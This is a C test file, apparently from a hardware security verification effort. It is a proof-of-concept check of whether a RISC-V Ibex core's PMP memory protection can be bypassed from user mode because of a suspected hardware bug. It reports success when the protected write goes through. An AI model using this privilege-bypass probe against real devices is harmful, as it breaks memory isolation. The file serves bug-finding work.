#include "sw/device/lib/testing/test_framework/check.h"
#include "sw/device/lib/testing/test_framework/ottf_main.h"
#include "sw/device/lib/base/log.h"
#include "sw/device/lib/base/csr.h"
#include "sw/device/lib/base/csr_registers.h"
#include "sw/device/lib/base/memory.h"

// Symbols provided by assembly.
extern void enter_user_mode(void *user_fn);
extern void trap_handler(void);
extern void user_func(void);
extern volatile uint32_t user_result;
extern volatile uint32_t target_data;
extern void after_user(void);

OTTF_DEFINE_TEST_CONFIG();

bool test_main(void) {
  LOG_INFO("ibex PMP exploit POC start");

  // Prepare the target data in memory. This is the memory region we will
  // protect with PMP (deny for less-privileged modes). If PMP is working,
  // an access from U-mode should trap and be caught by our handler. If the
  // hardware bug is present (access_fail hardcoded to 0), the access will
  // succeed and the value will be updated.
  user_result = 0xFFu;
  target_data = 0x11111111u;

  uintptr_t target_addr = (uintptr_t)&target_data;

  LOG_INFO("target_data addr = 0x%08x", (uint32_t)target_addr);

  // Configure a PMP NAPOT region that covers the target. We choose a 4 KiB
  // region aligned at 4 KiB for simplicity.
  const uint32_t pmp_size = 4096u;
  const uintptr_t pmp_base = target_addr & ~(pmp_size - 1u);

  // Compute PMP NAPOT-encoded address: (base >> 2) | ((size/2 - 1))
  uint32_t pmpaddr = (uint32_t)((pmp_base >> 2) | ((pmp_size / 2u - 1u)));

  // pmpcfg0: 8-bit cfg for pmp0 in bits [7:0]. A field in bits [4:3].
  // We want A = NAPOT (3), R/W/X = 0 (deny all).
  uint8_t pmp0cfg = (3u << 3); // A = 3 (NAPOT), R/W/X = 0
  uint32_t pmpcfg0_val = (uint32_t)pmp0cfg;

  LOG_INFO("Configuring PMP: pmpaddr=0x%08x pmpcfg0=0x%02x", pmpaddr, pmp0cfg);

  // Write PMP CSRs (must be performed in M-mode).
  CSR_WRITE(CSR_REG_PMPADDR0, pmpaddr);
  CSR_WRITE(CSR_REG_PMPCFG0, pmpcfg0_val);

  // Install the trap handler (M-mode) so we can catch the expected fault
  // if the U-mode access is denied.
  CSR_WRITE(CSR_REG_MTVEC, (uint32_t)trap_handler);

  // Ensure MSTATUS.MPP is set to U (00) so that mret will return to U-mode.
  uint32_t mstatus_val;
  CSR_READ(CSR_REG_MSTATUS, &mstatus_val);
  // Clear MPP bits [12:11]. Setting to 0 (U-mode).
  mstatus_val &= ~(3u << 11);
  CSR_WRITE(CSR_REG_MSTATUS, mstatus_val);

  LOG_INFO("Switching to U-mode to perform the access test");

  // Call assembly helper that sets mepc to user_func and does mret. We pass
  // the user function pointer; the assembly uses the mepc set to that addr.
  enter_user_mode((void *)user_func);

  // Execution resumes here (after_user) when the trap handler adjusts mepc to
  // point to this location and returns to M-mode.
  LOG_INFO("Returned to M-mode after U-mode execution");
  LOG_INFO("user_result=%d, target_data=0x%08x", (int)user_result,
           (uint32_t)target_data);

  // If the user write succeeded (user_result == 1) then the PMP did NOT
  // block the access -> vulnerability present.
  if (user_result == 1u) {
    LOG_INFO("VULNERABLE: U-mode write to PMP-protected region succeeded");
    // Assert true to make test framework report success of exploit POC.
    return true;
  } else {
    LOG_INFO("PMP correctly trapped the U-mode access (expected)");
    CHECK(false, "PMP did not bypass access controls (unexpected for exploit POC)");
    return false;
  }
}
